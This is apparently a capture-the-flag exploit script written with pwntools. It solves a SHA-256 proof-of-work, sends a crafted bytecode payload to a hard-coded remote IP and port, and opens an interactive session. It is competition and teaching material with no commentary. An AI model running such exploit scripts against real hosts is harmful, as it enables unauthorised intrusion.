from pwn import *

import string
from hashlib import sha256

context.log_level='debug'

def dopow():
    chal = c.recvline()
    post = chal[12:28]
    tar = chal[33:-1]
    c.recvuntil(':')
    found = iters.bruteforce(lambda x:sha256(x+post).hexdigest()==tar, string.ascii_letters+string.digits, 4)
    c.sendline(found)


#c = remote('127.0.0.1', 10002)
c = remote('34.92.185.118', 10003)
dopow()
code = '\x02\x02\x05\01\x35\x02'+'\x00'*10+'\x05\x41'
#code = '\x02\x01\x33\x06\x05\x00\x02\x00\x36'
c.sendlineafter('(hex): ', code.encode('hex'))
c.interactive()
